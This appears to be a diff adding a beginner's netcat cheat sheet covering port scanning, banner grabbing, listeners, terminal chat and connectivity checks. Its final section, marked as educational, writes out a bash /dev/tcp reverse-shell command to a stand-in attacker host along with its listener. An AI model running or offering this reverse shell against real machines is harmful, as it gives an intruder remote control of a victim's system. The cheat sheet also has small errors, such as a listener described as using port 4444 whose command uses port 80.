@@ -1,0 +1,62 @@
+##-net cut allows you to do
+Port scanning (basic)
+Banner grabbing
+Testing connectivity
+File transfer
+Setting up simple chat sessions
+Debugging network services
+--------------------------
+
+##-Check if Netcat is installed
+nc -h
+if not installed:
+sudo apt install netcat-traditional
+----------------------------
+
+##-Simple Port Scan
+Netcat can quickly check if a port is open:
+nc -zv <target-ip> <port>
+Example:
+nc -zv www.google.com 80
+---------------------------
+
+##-Banner Grabbing (Service Information)
+Useful for ethical hacking fingerprinting.
+nc <target-ip> <port>
+Example:
+nc www.google.com 80
+Then type:
+GET / HTTP/1.0
+You will see the server’s banner (Apache, Nginx, etc.).
+----------------------------
+
+##-Create a Listener (Server Mode)
+Listening on port 4444:
+nc -lvnp 80
+-l → listen
+-v → verbose
+-n → no DNS lookup
+-p → port
+---------------------------
+
+##-Connect to the Listener (Client Mode) send message between terminals
+open two terminal
+terminal 1: 
+nc -l -p 1234
+terminal 2:
+nc terminal 1 ip 1234
+---------------------------
+
+##-Check if a port is reachable (TCP handshake test)
+nc -v -z <ip> <port>
+Example:
+nc -v -z google.com 443
+---------------------------
+
+##-Reverse Shell (Educational Only – Do NOT misuse)
+Listener (attacker machine):
+nc -lvnp 4444
+Reverse shell (victim machine — your lab only):
+bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
+
+
